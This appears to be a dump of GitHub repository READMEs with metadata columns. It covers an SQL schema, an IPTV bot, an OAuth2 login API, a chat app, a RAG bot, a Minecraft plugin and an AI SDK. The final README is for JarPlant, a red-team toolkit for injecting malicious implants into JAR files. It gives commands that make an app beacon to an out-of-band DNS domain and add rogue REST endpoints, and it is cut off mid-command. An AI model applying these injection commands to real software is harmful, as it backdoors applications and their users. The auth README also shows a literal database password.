    ReceiverID VARCHAR2(20 BYTE) REFERENCES MemberDB(USERID),
    MessageContent CLOB,
    SendDate TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    ReadStatus VARCHAR2(1 BYTE) DEFAULT 'N' CHECK (ReadStatus IN ('Y', 'N'))
);

-- ì‹ ê³  (reprotDB) í…Œì´ë¸”
CREATE TABLE reportDB (
    postId NUMBER(5, 0),
    reason VARCHAR2(4000),
    userId VARCHAR2(20),
    reportDate VARCHAR2(10),
    CONSTRAINT reportDB_pk PRIMARY KEY (postId, userId),
    CONSTRAINT reportdb_postid_fk FOREIGN KEY (postId) REFERENCES postDB(postId) ON DELETE CASCADE,
    CONSTRAINT reportdb_userid_fk FOREIGN KEY (userId) REFERENCES memberDB(userId)
);



----------<ì‹œí€€ìŠ¤>
-- ê°ë…,ì €ìid ì‹œí€€ìŠ¤ (   producerIdSeq.NEXTVAL   )
CREATE SEQUENCE producerIdSeq NOCACHE;

--ì»¨í…ì¸ id ì‹œí€€ìŠ¤ (   contIdSeq.NEXTVAL   )
CREATE SEQUENCE contIdSeq NOCACHE;

--ê²Œì‹œê¸€ ì‹ë³„ë²ˆí˜¸ id ì‹œí€€ìŠ¤ (   postIdSeq.NEXTVAL   )
CREATE SEQUENCE postIdSeq NOCACHE;

--ëŒ“ê¸€ ì‹ë³„ë²ˆí˜¸ id ì‹œí€€ìŠ¤ (   comId.NEXTVAL   )
CREATE SEQUENCE comIdSeq NOCACHE;

--ê²Œì‹œê¸€ ë§ë¨¸ë¦¬ ì‹œí€€ìŠ¤ (   POSTCATEGORIESSEQ.NEXTVAL   )
CREATE SEQUENCE POSTCATEGORIESSEQ
START WITH 1
INCREMENT BY 1
NOMAXVALUE;

--ìª½ì§€id ì‹œí€€ìŠ¤ (   MessageID_Seq.NEXTVAL   )
CREATE SEQUENCE MessageID_Seq
START WITH 1
INCREMENT BY 1
NOCACHE
NOCYCLE;

--ë””ë²„ê·¸ ê²Œì‹œíŒìš© ì‹œí€¸ìŠ¤
CREATE SEQUENCE debugBoard_seq
 INCREMENT BY 1
 START WITH 1
 MINVALUE 1
 MAXVALUE 99999
 NOCYCLE;

----------<íŠ¸ë¦¬ê±°> => ê°œë³„ë¡œ ì‹¤í–‰í•´ì•¼ ì •ìƒì ìœ¼ë¡œ ì»´íŒŒì¼ ë¨.
--postdb insertì‹œ postinfodb ê°™ì€ postidë¡œ ìƒì„±ë˜ê²Œ í•˜ëŠ” íŠ¸ë¦¬ê±°
CREATE OR REPLACE TRIGGER trg_post_after_insert
AFTER INSERT ON postdb
FOR EACH ROW
BEGIN
  INSERT INTO postinfodb (POSTID, VIEWNUM)
  VALUES (:new.POSTID, 0);
END;

--PostCategories í…Œì´ë¸” => categoryId ìë™ ì¦ê°€ ë° updatedAt ìë™ ê°±ì‹  êµ¬í˜„: categoryId ìë™ ì¦ê°€
CREATE OR REPLACE TRIGGER trg_post_categories_id
BEFORE INSERT ON PostCategories
FOR EACH ROW
BEGIN
    SELECT POSTCATEGORIESSEQ.NEXTVAL
    INTO :new.categoryId
    FROM dual;
END;

-- PostCategories í…Œì´ë¸” => updated_at ìë™ ê°±ì‹  íŠ¸ë¦¬ê±°
CREATE OR REPLACE TRIGGER trg_post_categories_updated_at
BEFORE UPDATE ON PostCategories
FOR EACH ROW
BEGIN
    :new.updatedAt := CURRENT_TIMESTAMP;
END;
```
",0,0,18,210.0,"['orm', 'sql']","['orm', 'sql']",1.0,[org.springframework.boot:spring-boot-maven-plugin],1.0,0.0,0.0
ShafiqSadat/IPTVTelegramBot,master,"# IPTV Telegram Bot

IPTV Telegram Bot is a bot that lets you watch IPTV streams right in Telegram App. IPTV stands for Internet Protocol Television, which is a way of delivering live TV channels over the internet. With this bot, you can send the name of the channel you want to watch, and the bot will respond with available streams to watch. There are over 60000+ online streams from all over the world, covering various genres and languages.

![Screenshot of IPTV Telegram Bot](https://i.imgur.com/XVsp1Nd.png)

![Screenshot of IPTV Telegram Bot](https://raw.githubusercontent.com/ShafiqSadat/IPTVTelegramBot/master/screenshots/1.gif)
## How to use

- Clone this repository or download the zip file.
- Install the requirements using `mvn install`.
- Create a bot using [@BotFather](https://t.me/BotFather) and get the bot token.
- In BotFather, send the ""/setmenubutton"" command, select your bot, and send the following link: ```https://iptvnator.vercel.app/```. Then, provide a name for the button, such as ""Open Player.""
- Rename example_local.properties into local.properties under /src/main/resources/example_local.properties
- Edit the local.properties file and enter your bot token and username.
- Run the Main.java file using `java Main`.
- Start your bot and enjoy watching IPTV streams.

## Credits

- IPTV API: [iptv-org/iptv](https://github.com/iptv-org/iptv)
- Telegram API: [rubenlagus/TelegramBots](https://github.com/rubenlagus/TelegramBots)
- IPTV Player: [4gray/iptvnator](https://github.com/4gray/iptvnator)

## License

This project is licensed under the MIT License - see the [LICENSE] file for details.

## Contributing

If you want to contribute to this project, you are welcome to do so. Please follow these steps:

- Fork this repository and create a new branch for your feature or bug fix.
- Write your code and test it locally.
- Commit and push your changes to your forked repository.
- Create a pull request with a clear description of your changes and a link to the issue (if any) that you are addressing.
- Wait for the maintainer to review and merge your pull request.

## Contact

If you have any questions, suggestions, or feedback, you can contact me via:

- Email: ShafiqSadat2012@gmail.com
- Telegram: [@Shafiq](https://t.me/Shafiq)

## License
IPTVTelegramBot is licensed under the MIT License. The terms are as follows:

```
The MIT License (MIT)

Copyright (c) 2024 Shafiq Sadat

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the ""Software""), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```
",1,0,1,0.0,"['iptv', 'telegram', 'bot', 'how', 'use', 'credit', 'license', 'contribute', 'contact', 'license']","['license', 'iptv', 'telegram', 'bot', 'how']",1.0,[],0.0,1.0,0.0
anitalakhadze/multiple-auth-api,main,"## Introduction to the project
The repository contains application for users to login using email and password or using OAuth2 (Google or GitHub).
The backend app is meant to be run together with the frontend Angular application. You can find the corresponding repository [here](https://github.com/anitalakhadze/multiple-auth-ui).

## Technologies used
- **Backend**
    - Application is built using Java 17, Spring Boot 3 and Spring Security 6. Dependencies are managed using Maven. Authentication is done using JWT.
- **Database**
    - Postgresql is used as the database.


## Steps to run the applications
1. **Start up the database:**
    - Run Postgresql docker container with the following command (replace _{PASSWORD}_ with your own password):

      `docker run --name multiple-auth-app-postgres -e POSTGRES_PASSWORD={PASSWORD} -d -p 127.0.0.1:5432:5432 postgres`

      Don't change the port configuration when running in a local environment. The syntax of the mapping is for extra security, so that the database is not accessible from outside the container.

      If you change the password to the postgresql database, make sure to update the password in the application.properties file of the **_multiple-auth-api_** project.
    - If you need to connect to the postgresql database container, run the following command:

      `docker exec -it multiple-auth-app-postgres bash`
        - Connect to postgresql database, once inside the container:

          `psql -U postgres`
2. **Start up the multiple-auth-api:**
    - Run the following command from the root directory of the project (or just press the start button in your IDE):

      `./mvnw spring-boot:run`

    - Default port for the _multiple-auth-api_ is 8080. If you want to change the port, set the ""server.port"" property in the _application.properties_ file. If you change the port, make sure to update the port in the multiple-auth-ui project as well (_constants.ts_ file, ""API_BASE_URL"" parameter).

        - As this project uses OAuth2, make sure to update the redirect-uri in the _application.properties_ file and in configurations at OAuth2 providers (Google, GitHub, Twitter, etc.) too.
    - If you checked out from _main_ branch, you will see that _application.properties_ contains references to environment variables. Make sure to create a _.env_ file in the root of the project, and list all the required properties there as key-value pairs (don't forget to exclude this file from version control):
      ```
      DATABASE_USER=postgres
      DATABASE_PASSWORD=K29r8Dhc79n2gPG86CRhoVt9NBxTa0Gk
      ...
      ```
3. **Start up the multiple-auth-ui:**
    - Run the following command from the root directory of the project:

      `npm install`
    - Run the following command from the root directory of the project:

      `ng serve`
    - Default port for the multiple-auth-ui is 4200. If you want to change the port, update the port in the angular.json file. On the following path: _multiple-auth-ui -> architect -> serve_ add this:
        ```
        ""options"": {
            ""port"": [desired-port]
        }
        ```
        - Make sure to update authorized redirect uri usage places in the _multiple-auth-api_ too.
4. **Register a user in the database**
    - Open the database (either from your IDE or command-line) and create a new record in _users_ table containing only the email address with which you are planning to log in to the application. Without a registered email address, you won't be allowed to log in. Some login providers also require to register test user email addresses upfront (Google, for example), so make sure you don't skip this step as well (view more information [here](https://blog.devgenius.io/part-3-implementing-authentication-with-spring-boot-security-6-oauth2-and-angular-17-via-8716646ed062)).

## Are you curious about the development process?  
If you find this project useful, visit the following blogs and follow the creation project step-by-step:
- [PART 1 - Setting up backend project and security configurations](https://medium.com/dev-genius/implementing-authentication-with-spring-boot-security-6-oauth2-and-angular-17-via-multiple-4144075e5fef)
- [PART 2 - Setting up service and controller layers](https://medium.com/dev-genius/implementing-authentication-with-spring-boot-security-6-oauth2-and-angular-17-via-multiple-b48789a3777e)
- [PART 3 - Getting authorization credentials for Google, GitHub and Twitter](https://medium.com/dev-genius/part-3-implementing-authentication-with-spring-boot-security-6-oauth2-and-angular-17-via-8716646ed062)
- [PART 4 - Developing a minimal Angular application](https://medium.com/@anitalakhadze/part-4-implementing-authentication-with-spring-boot-security-6-oauth2-and-angular-17-via-df3fbb003946)

Donâ€™t forget to clap if you enjoyed the series and subscribe to stay updated with the upcoming content.

",0,0,7,8.0,"['introduction', 'project', 'technology', 'use', 'step', 'run', 'application', 'are', 'curious', 'development', 'process']","['introduction', 'project', 'technology', 'use', 'step']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
sasmithx/Chat_Application_Socket_Progrmming,master,"![Logo](https://github.com/sasmithx/Chat_Application_Socket_Progrmming/blob/master/src/main/resources/assests/Client-Server-Network-Model.jpg)

# PLAY TECH PVT LTD.

This project is a simple chat application built using Java Socket programming. It features a client-server architecture, enabling real-time text and image communication between multiple clients. The application also includes an emoji picker, allowing users to send emojis in their chat messages.

## Table of Contents

- Features
- Technologies Used
- Setup
- How to Run
- Usage
- Screenshots
- Contributing
- License
- Contact

## Features

- Real-time text communication between clients.
- Ability to send and receive images.
- Emoji picker for sending emojis in chat.
- User authentication based on a simple name validation.
- Responsive and intuitive user interface.

## Technologies Used

- **Java:** Core programming language.
- **JavaFX:** Used for the graphical user interface.
- **Socket Programming:** Used for client-server communication.
- **FXML:** For defining the UI layout.
- **CSS:** For styling the UI components.

## Setup

To set up the project locally, follow these steps:

**1.** **Clone the repository:**
```bash
https://github.com/sasmithx/Chat_Application_Socket_Progrmming.git
```
**2.** **Import the project:**

- Open your favorite IDE (like IntelliJ IDEA, Eclipse, or NetBeans).
- Import the project as a Maven/Gradle project.
- Ensure that the JavaFX library is properly configured in your IDE.

**3.** **Configure JavaFX:**

- Download JavaFX SDK if you haven't already.
- Configure the JavaFX SDK path in your project settings.

## How to Run

**1.** **Run the Server:**

- Run the Server.java file to start the server.
- The server will start listening on port 5003 by default.


**2.** **Run the Client:**

- Run the ClientController.java file to start the client.
- Enter your username in the login screen.
- Start chatting with other connected clients.

## Usage

- **Login:** Enter a username (between 4 and 15 alphabetic characters) to join the chat.
- **Send a Message:** Type your message in the input field and press enter or click the send button.
- **Send an Image:** Click on the image icon to select and send an image.
- **Send an Emoji:** Click on the emoji icon to select and send an emoji.
- **Receive Messages:** All incoming messages, images, and emojis will be displayed in the chat window.

## Screenshots

<img src=""https://github.com/sasmithx/Chat_Application_Socket_Progrmming/blob/master/src/main/resources/assests/Screenshots/Screenshot%202024-08-22%20184323.png"" width=""600px"" height=""auto"">

<img src=""https://github.com/sasmithx/Chat_Application_Socket_Progrmming/blob/master/src/main/resources/assests/Screenshots/Screenshot%202024-08-22%20184245.png"" width=""600px"" height=""auto"">

## Contributing

Contributions are welcome! Please fork this repository and submit a pull request with your changes.


## License

This project is licensed under the MIT License - see the [MIT License](LICENSE)  file for details.

## 
<br>

<div align=""center""> 
<a href=""https://github.com/sasmithx"" target=""_blank""><img src = ""https://img.shields.io/badge/GitHub-000000?style=for-the-badge&logo=github&logoColor=white""></a>
<a href=""https://git-scm.com/"" target=""_blank""><img src = ""https://img.shields.io/badge/Git-000000?style=for-the-badge&logo=git&logoColor=white""></a>
<a href=""https://maven.apache.org/download.cgi"" target=""_blank""><img src = ""https://img.shields.io/badge/Maven-000000?style=for-the-badge&logo=apachemaven&logoColor=white""></a>
<a href=""https://www.jetbrains.com/idea/download/?section=windows"" target=""_blank""><img src = ""https://img.shields.io/badge/intellij-000000?style=for-the-badge&logo=intellijidea&logoColor=white""></a>
<a href=""https://www.asus.com/lk/"" target=""_blank""><img src = ""https://img.shields.io/badge/asus%20laptop-000000?style=for-the-badge&logo=asus&logoColor=white""
<a href=""https://ubuntu.com/"" target=""_blank""><img src = ""https://img.shields.io/badge/Ubuntu-E95420?style=for-the-badge&logo=ubuntu&logoColor=white""
                                                
</div>

<br>

<p align=""center"">
  &copy; 2024 Sasmith Manawadu
</p>

",0,0,1,0.0,"['play', 'tech', 'pvt', 'ltd', 'table', 'content', 'feature', 'technology', 'use', 'setup', 'how', 'run', 'usage', 'screenshots', 'contribute', 'license']","['play', 'tech', 'pvt', 'ltd', 'table']",1.0,[],0.0,1.0,0.0
miliariadnane/spring-boot-doc-rag-bot,main,"<div style=""display: flex; align-items: center; justify-content: center; margin: auto;"">
  <img src=""docs/images/logo.png"" alt=""Logo"" width=180 height=180 />
  <h1>Spring Boot Documentation Bot</h1>
</div>

# ğŸŒ Description

> This repository contains a documentation bot powered by a large language model (LLM) using LangChain4j to quickly find answers to your Spring Boot questions. It allows easy browsing of Spring documentation and leverages retrieve and gather (RAG) to extract relevant details on demand. The bot is built with Spring Boot and uses LangChain4j to ingest Spring documentation URLs into the model for enhanced question answering about Spring frameworks and the overall Spring ecosystem.

## ğŸ“š Table of Contents

- [Prerequisites](#-prerequisites)
- [Installing](#-installing)
- [Built With](#-built-with)
- [License](#-license)
- [Support](#-support)
- [Application Screenshot](#-application-screenshot)

### ğŸ“‹ Prerequisites

- Java 20
- Maven
- API keys for [Open API](https://platform.openai.com/)

### ğŸ”§ Installing

1. Clone the repository on your local machine.
    ```shell
    git clone https://github.com/miliariadnane/spring-boot-doc-rag-bot
    cd spring-boot-doc-rag-bot
    ```
2. Open the `application.yml` file and replace `OPEN_API_KEY` with your own Open API key. For demo purposes, you can use the key ""demo"".

3. Build the project.
    ```shell
    mvn clean install
    ```
4. Run your Spring Boot application.
    ```shell
    mvn spring-boot:run

## ğŸ› ï¸ Built With

- [Spring Boot](https://spring.io/projects/spring-boot) - The web framework used
- [Maven](https://maven.apache.org/) - Dependency Management
- [LangChain4j](https://github.com/langchain4j) - Used for integration of AI/LLM models into Java applications

## ğŸ“ License

This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details

## ğŸŒŸ Support

> If you find this project useful or interesting, please consider giving it a star â­ on GitHub. Your support is greatly appreciated!
> Also, if you have a moment, don't forget to make a duaa ğŸ¤² for me and my parents. Thank you for your support!

## ğŸ“¸ Application Screenshot

![Screenshot](docs/images/screenshot.png)
",0,0,1,0.0,"['description', 'table', 'content', 'prerequisite', 'instal', 'build', 'with', 'license', 'support', 'application', 'screenshot']","['description', 'table', 'content', 'prerequisite', 'instal']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
corentingosselin/ProdigyCape,main,"<div align=""center"">
  <a href=""https://www.spigotmc.org/resources/116899/""><img src=""https://img.shields.io/badge/Minecraft%20version-1.19.4_--_1.21-brightgreen.svg"" alt=""Minecraft version""></a>
  <a href=""https://www.spigotmc.org/resources/116899/reviews""><img src=""https://img.shields.io/spiget/rating/116899?label=Spigot%20rating"" alt=""Spigot rating""></a>
  <a href=""https://www.spigotmc.org/resources/116899/""><img src=""https://img.shields.io/spiget/downloads/116899?label=Spigot%20downloads"" alt=""Spigot downloads""></a>
  <a href=""https://www.paypal.com/donate/?hosted_button_id=56KN7WE2G324C""><img src=""https://img.shields.io/badge/Donate-PayPal-blue.svg"" alt=""Minecraft version""></a>
  <img width=""1000px"" src=""https://github.com/max1mde/ProdigyCape/assets/114857048/1f06b099-42ec-4f9c-9ea9-e6bd669ba4c9"">
  <h1>Add custom capes to your Minecraft server</h1>
  <h3>Which works even without a mod or resourcepack!</h3>
  <img src=""https://github.com/max1mde/ProdigyCape/assets/114857048/40b6942c-4c4a-4736-9db3-1a44868f17a6"">
</div>

> [!CAUTION]
> The Mojang EULA does not allow to sell capes! We are not responsible for your actions!

> [!IMPORTANT]  
> **PacketEvents is currently required as dependencies!**     
> [PacketEvents](https://www.spigotmc.org/resources/packetevents-api.80279/)    
> You can also use passengerapi if you have plugin conflict using passenger features
> > [PassengerAPI](https://www.spigotmc.org/resources/passengerapi-entity-passenger-bug-fixes-more.117017/)    
> Also add [Vault](https://www.spigotmc.org/resources/vault.34315/) if you want to use the shop system


## Example config
```yml
mojang:
  enabled: true
  texture: eyJ0ZXh0dXJlcyI6eyJTS0lOIjp7InVybCI6Imh0dHA6Ly90ZXh0dXJlcy5taW5lY3JhZnQubmV0L3RleHR1cmUvZjc3MDVlM2U5OTdlNWNlNTIxNjY2M2M5ZTY0YjM5NmZhNDNlZGRlODI1NWZkOTEwZjBjYzgxYTAzMjVlNmIifX19
  name: Â§4Mojang Staff
  description: Â§7Mojang's official cape
  price: 0
  limited_edition: 0
  number_sold: 0
minecon_creeper:
  enabled: true
  texture: eyJ0ZXh0dXJlcyI6eyJTS0lOIjp7InVybCI6Imh0dHA6Ly90ZXh0dXJlcy5taW5lY3JhZnQubmV0L3RleHR1cmUvMzk3NmFhYzc2MjEwYjAzZTRjMzg5MWJkZjc5OTMyMmUzMGE3ZThhMTI3MmIyNzkwMzI2YmYwOGYyMTkyYWNkNiJ9fX0=
  name: Â§cMinecon 2011
  description: Â§7Minecon cape from 2011
  price: 0
  limited_edition: 0
  number_sold: 0
minecon_pickaxe:
  enabled: true
  texture: eyJ0ZXh0dXJlcyI6eyJTS0lOIjp7InVybCI6Imh0dHA6Ly90ZXh0dXJlcy5taW5lY3JhZnQubmV0L3RleHR1cmUvNTRlNDM1OGQ3MzRhNmUwNjhlYjA3Y2I4ZmM1ZmZkZThiOTQ4MDBlYjM5Njc3NzQyOGE0ZjU1OTMxNWExZmY0ZCJ9fX0=
  name: Â§2Minecon 2012
  description: Â§7Minecon cape from 2012
  price: 0
  limited_edition: 0
  number_sold: 0
```

## Commands
```
/cape help - prodigycape.help - Show help menu
/cape apply <cape> - no permission - Apply any owned cape
/cape menu - prodigycape.menu - Show your owned cape in inventory menu
/cape shop - prodigycape.shop - Open inventory menu to buy cape
/cape reload - prodigycape.admin - Reload the configurations
/cape sync - prodigycape.admin - Synchronise capes.yml with database mysql
```

## Permissions
```
Individual cape permission: prodigy.cape.<cape_name>
All cape: prodigy.cape.*
Bypass disabled cape to apply:
prodigy.cape.bypass
```

# TO-DO List

- [x] Full packet events implementation (No NMS anymore)
- [ ] Better cape physics
- [ ] Java API for developers
",6,8,6,10.0,"['example', 'config', 'command', 'permission', 'list']","['example', 'config', 'command', 'permission', 'list']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,1.0,0.0
vacuityv/ai-java-sdk,develop,"[[ä¸­æ–‡]](https://github.com/vacuityv/ai-java-sdk/tree/develop) [[English]](https://github.com/vacuityv/ai-java-sdk/blob/develop/README-eng.md)

# AI-Java-Sdk

> æ¬¢è¿ä½“éªŒä¸ªäººå¯¹æ¥çš„å„å¤§å‚å•†AIçš„äº¤äº’ç½‘ç«™ï¼š[AI-CHAT äº¤äº’ç½‘ç«™](https://chat.vacuity.me/)

ä¸ºä½¿ç”¨å„å¤§AIå‚å•†æä¾›çš„APIåˆ›å»ºçš„java sdkï¼Œç›®å‰æ”¯æŒGoogle Gemini å’Œ Claude AI ä»¥åŠ openai çš„ chatã€file å’Œ assistant (v2)
éƒ¨åˆ†åŠŸèƒ½ã€‚

## æ”¯æŒçš„ Claude api

- [å¯¹è¯ (å«visionï¼Œæ”¯æŒfunction)](https://docs.anthropic.com/claude/reference/messages_post)
- [æµå¼å¯¹è¯ (å«vision)](https://docs.anthropic.com/claude/reference/messages-streaming)

## æ”¯æŒçš„ Google Gemini

- [å¯¹è¯ (å«vision)](https://ai.google.dev/tutorials/rest_quickstart)
- [æµå¼å¯¹è¯ (å«vision)](https://ai.google.dev/tutorials/rest_quickstart)

## æ”¯æŒçš„ openAI

> æ”¯æŒå‡½æ•°è°ƒç”¨ï¼Œè¯·å‚è€ƒ OpenaiTestï¼ˆå‡½æ•°éƒ¨åˆ†å®ç°å¤§é‡å‚è€ƒäº† https://github.com/TheoKanning/openai-java ï¼‰

- [å¯¹è¯ (å«vision)](https://platform.openai.com/docs/api-reference/chat/create)
- [æµå¼å¯¹è¯ (å«vision)](https://platform.openai.com/docs/api-reference/chat/streaming)
- [æ–‡ä»¶](https://platform.openai.com/docs/api-reference/files)
- [Assistant (å«stream)](https://platform.openai.com/docs/api-reference/assistants)
- [Image](https://platform.openai.com/docs/api-reference/images)

## Importing

### Maven

```xml
<dependency>
    <groupId>me.vacuity.ai.sdk</groupId>
    <artifactId>ai-java-sdk</artifactId>
    <version>${version}</version>       
</dependency>
```

åœ¨è¿™é‡Œå¯ä»¥æŸ¥çœ‹æœ€æ–°çš„ç‰ˆæœ¬å·ï¼š[Maven Central](https://central.sonatype.com/artifact/me.vacuity.ai.sdk/ai-java-sdk)

## ä½¿ç”¨

æ™®é€šå¯¹è¯ï¼š

```java

@Test
public void chat() {
    ClaudeClient client = new ClaudeClient(API_KEY);
    List<ChatMessage> messages = new ArrayList<>();
    messages.add(new ChatMessage(""user"", ""introduce yourself pls""));
    ChatRequest request = ChatRequest.builder()
            .model(""claude-3-opus-20240229"")
            .messages(messages)
            .maxTokens(1024)
            .build();
    try {
        ChatResponse response = client.chat(request);
        System.out.println(response);
    } catch (VacException e) {
        if (e.getDetail() != null) {
            System.out.println(e.getDetail().getError().getMessage());
        }
    }
}
```

æµå¼å¯¹è¯ï¼š

```java

@Test
public void streamChat() {
    ClaudeClient client = new ClaudeClient(API_KEY);
    List<ChatMessage> messages = new ArrayList<>();
    messages.add(new ChatMessage(""user"", ""é²è¿…ä¸ºä»€ä¹ˆæ‰“å‘¨æ ‘äºº""));
    ChatRequest request = ChatRequest.builder()
            .model(""claude-3-opus-20240229"")
            .messages(messages)
            .maxTokens(1024)
            .build();
    Flowable<StreamChatResponse> response = client.streamChat(request);
    response.doOnNext(s -> {
        if (""content_block_delta"".equals(s.getType())) {
            ChatMessageContent content = s.getDelta();
            System.out.print(content.getText());
        } else if (""error"".equals(s.getType())) {
            System.out.println(s.getError().getMessage());
        }
    }).blockingSubscribe();
}
```

openAI visionï¼š

```java

@Test
public void vision() throws IOException {
    String imagePath = ""222.jpg"";
    Path path = Paths.get(imagePath);
    // read file
    byte[] imageBytes = Files.readAllBytes(path);

    InputStream is = new BufferedInputStream(new FileInputStream(imagePath));
    String mimeType = URLConnection.guessContentTypeFromStream(is);

    // convert image to base64 data
    String base64Image = Base64.getEncoder().encodeToString(imageBytes);
    base64Image = ""data:"" + mimeType + "";base64,"" + Base64.getEncoder().encodeToString(imageBytes);
    String url = ""https://upload.wikimedia.org/wikipedia/commons/thumb/d/dd/Gfp-wisconsin-madison-the-nature-boardwalk.jpg/2560px-Gfp-wisconsin-madison-the-nature-boardwalk.jpg"";

    OpenaiClient client = new OpenaiClient(API_KEY, Duration.ofSeconds(120));
    List<ChatMessage> messages = new ArrayList<>();

    ChatMessageContent content = new ChatMessageContent();
    ChatMessageContent.ImageUrl imageUrl = new ChatMessageContent.ImageUrl();
    // imageUrl.setUrl(url);
    imageUrl.setUrl(base64Image);
    content.setType(""image_url"");
    content.setImageUrl(imageUrl);
    ChatMessageContent content2 = new ChatMessageContent();
    content2.setType(""text"");
    content2.setText(""what is this?"");

    ChatMessage chatMessage = new ChatMessage(""user"", Arrays.asList(content, content2));
    messages.add(chatMessage);

    ChatRequest request = ChatRequest.builder()
            .model(""gpt-4-vision-preview"")
            .messages(messages)
            .build();
    Flowable<StreamChatResponse> response = client.streamChat(request);
    response.doOnNext(s -> {
        System.out.println(s.getSingleContent());
    }).blockingSubscribe();
}
```

### è‡ªå®šä¹‰åœ°å€å’Œè¶…æ—¶æ—¶é—´

```java
ClaudeClient client = new ClaudeClient(API_KEY, Duration.ofSeconds(100), ""https://example.com"");
```

### ä½¿ç”¨httpä»£ç†

```java

@Test
@Test
public void proxyChat() {
    String host = ""127.0.0.1"";
    int port = 7890;
    Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(host, port));

    ClaudeClient client = new ClaudeClient(API_KEY, Duration.ofSeconds(60), proxy);

    List<ChatMessage> messages = new ArrayList<>();
    messages.add(new ChatMessage(""user"", ""introduce yourself pls""));
    ChatRequest request = ChatRequest.builder()
            .model(""claude-3-opus-20240229"")
            .messages(messages)
            .maxTokens(1024)
            .build();
    try {
        ChatResponse response = client.chat(request);
        System.out.println(response.getContent().get(0).getText());
    } catch (VacSdkException e) {
        if (e.getDetail() != null) {
            System.out.println(e.getDetail().getError().getMessage());
        }
    }
}
```

## å…¶ä»–

ä½ å¯ä»¥åœ¨ CludeTest å’Œ GeminiTest ä»¥åŠ OpenaiTest/OpenaiAssistantTest æŸ¥çœ‹ä»£ç ç¤ºä¾‹

## FAQ

### æ”¯æŒä»€ä¹ˆæ¨¡å‹

ç›®å‰æ”¯æŒClaude ai å’Œ Google Gemini ä»¥åŠ Openai çš„éƒ¨åˆ†æ¨¡å‹

### openai è¿˜æœ‰å¾ˆå¤šå…¶ä»–åŠŸèƒ½ï¼Œè¿™ä¸ªsdkä¸æ”¯æŒå—

openai ç›®å‰åœ¨githubä¸Šéƒ½æœ‰å¯¹åº”çš„sdkæ”¯æŒï¼ˆæ¯”å¦‚ï¼šhttps://github.com/TheoKanning/openai-java ï¼‰ï¼Œæ‰€ä»¥ä¸æ˜¯ç´§æ€¥çš„éœ€æ±‚ï¼Œä¹Ÿè®¸ä¼šåœ¨æœªæ¥æ”¯æŒ

## License

Published under the MIT License

## å¦‚æœæ‚¨æœ‰ä½™åŠ›ï¼Œæ¬¢è¿è´¡çŒ®ä»£ç  or Money

<img width=""200"" height=""200"" src=""https://github.com/vacuityv/self-pay/blob/main/vac-wechat.jpg""/>


<img width=""200"" height=""200"" src=""https://github.com/vacuityv/self-pay/blob/main/vac-alipay.jpg""/>
",14,0,3,4.0,"['claude', 'api', 'google', 'gemini', 'openai', 'import', 'maven', 'faq', 'openai', 'license', 'money']","['openai', 'claude', 'api', 'google', 'gemini']",1.0,"[org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,1.0,0.0
w1th4d/JarPlant,main,"# Java Archive Implant Toolkit

Inject malicious payloads into JAR files.

## Quickstart

Building:

```
git clone git@github.com:w1th4d/JarPlant.git
cd JarPlant
mvn package
mv jarplant-cli/target/jarplant-cli-<version>-jar-with-dependencies.jar jarplant.jar
```

Make sure to substitute `<version>` with the current version.

Usage:

```
       _____               ______  __                __   
     _|     |.---.-..----.|   __ \|  |.---.-..-----.|  |_ 
    |       ||  _  ||   _||    __/|  ||  _  ||     ||   _|
    |_______||___._||__|  |___|   |__||___._||__|__||____|
    Java archive implant toolkit   v0.1   by w1th4d & kugg

positional arguments:
  command
    class-injector       Inject a class implant  into  any JAR. The implant
                         will detonate whenever  any  class  in  the JAR is
                         used but  the  payload  will  only  run  once  (or
                         possibly twice in  some  very  fringe cases). This
                         is the most versatile implant  type and works with
                         any JAR (even ones  without  a main function, like
                         a library).
    spring-injector      Inject  a  Spring  component   implant  into  JAR-
                         packaged Spring  application.  The  component will
                         be loaded and included in  the Spring context. The
                         component could be  something  like  an extra REST
                         controller or scheduled task.
    implant-list         List all bundled implants.
    implant-info         See more details  about  a  specific implant. This
                         includes reading its  class  to  see all available
                         configuration properties and  their  data types. A
                         class file path can be  specified to read a custom
                         implant.
    decoder              Utility to decode stuff  generated  by some of the
                         built-in payloads.

named arguments:
  -h, --help             show this help message and exit

for more options, see command help pages:
  $ java -jar jarplant.jar class-injector -h
  $ java -jar jarplant.jar spring-injector -h
    ...

example usage:
  $ java -jar jarplant.jar class-injector \
    --target path/to/target.jar --output spiked-target.jar
```

## Quick grabs

These are some examples of things you may be interested in.

Spike any Java app or library to call home to an out-of-band DNS catcher (like Interactch or Burp Collaborator):

```shell
java -jar jarplant.jar class-injector \
   --target path/to/target.jar \
   --implant DnsBeaconImplant \
   --config CONF_DOMAIN=$YOUR_OAST_DOMAIN 
```

Replace `$YOUR_OAST_DOMAIN` with your `*.oast.fun` domain (or whatever out-of-band service you use).

Decode the domain name caught by your DNS server:

```shell
java -jar jarplant.jar decoder $ENCODED_FQDN 
```

Replace `$ENCODED_FQDN` with the domain name in the DNS query.

Spike a Spring Boot app to include a rogue REST endpoint:

```shell
java -jar jarplant.jar spring-injector \
